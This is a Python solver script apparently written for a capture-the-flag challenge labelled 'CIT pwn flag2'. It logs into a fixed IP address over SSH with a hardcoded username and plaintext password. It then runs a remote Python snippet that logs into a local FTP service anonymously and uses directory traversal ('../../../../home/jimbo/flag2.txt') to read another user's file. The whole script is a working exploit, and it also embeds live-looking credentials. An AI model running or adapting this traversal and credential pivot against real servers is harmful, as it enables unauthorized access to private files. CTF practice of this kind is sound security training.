#!/usr/bin/env python3
import argparse
import re
import sys


def get_flag2_via_ssh(
    host: str,
    ssh_port: int,
    ssh_user: str,
    ssh_password: str,
    ftp_port: int,
) -> str:
    try:
        import paramiko
    except Exception:
        print(
            "[!] Missing dependency: paramiko\n"
            "    Install with: pip install paramiko",
            file=sys.stderr,
        )
        sys.exit(1)

    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(
        hostname=host,
        port=ssh_port,
        username=ssh_user,
        password=ssh_password,
        look_for_keys=False,
        allow_agent=False,
        timeout=10,
    )

    remote_script = f"""python3 - <<'PY'
from ftplib import FTP
from io import BytesIO
ftp = FTP()
ftp.connect('127.0.0.1', {ftp_port}, timeout=10)
ftp.login('anonymous', 'anonymous')
buf = BytesIO()
ftp.retrbinary('RETR ../../../../home/jimbo/flag2.txt', buf.write)
ftp.quit()
print(buf.getvalue().decode(errors='ignore').strip())
PY"""

    _, stdout, stderr = client.exec_command(remote_script)
    out = stdout.read().decode(errors="ignore")
    err = stderr.read().decode(errors="ignore")
    client.close()

    if err.strip():
        print("[-] Remote error:", file=sys.stderr)
        print(err.strip(), file=sys.stderr)
        sys.exit(2)

    m = re.search(r"(CIT\{[^}\n]+\})", out)
    if not m:
        print("[-] Could not extract flag2 from output.", file=sys.stderr)
        print(out.strip(), file=sys.stderr)
        sys.exit(3)
    return m.group(1)


def main() -> None:
    parser = argparse.ArgumentParser(description="CIT pwn flag2 solver")
    parser.add_argument("--host", default="23.179.17.69")
    parser.add_argument("--ssh-port", type=int, default=22)
    parser.add_argument("--ftp-port", type=int, default=10921)
    parser.add_argument("--ssh-user", default="greg")
    parser.add_argument(
        "--ssh-password",
        default="DXIjeNZC8Tf2SrjtRaWg1h4SZl5DZk6G",
        help="Password for SSH user",
    )
    args = parser.parse_args()

    print(f"[*] SSH login: {args.ssh_user}@{args.host}:{args.ssh_port}")
    print(f"[*] Using internal FTP traversal on 127.0.0.1:{args.ftp_port}")
    flag2 = get_flag2_via_ssh(
        host=args.host,
        ssh_port=args.ssh_port,
        ssh_user=args.ssh_user,
        ssh_password=args.ssh_password,
        ftp_port=args.ftp_port,
    )
    print(f"[+] flag2: {flag2}")


if __name__ == "__main__":
    main()
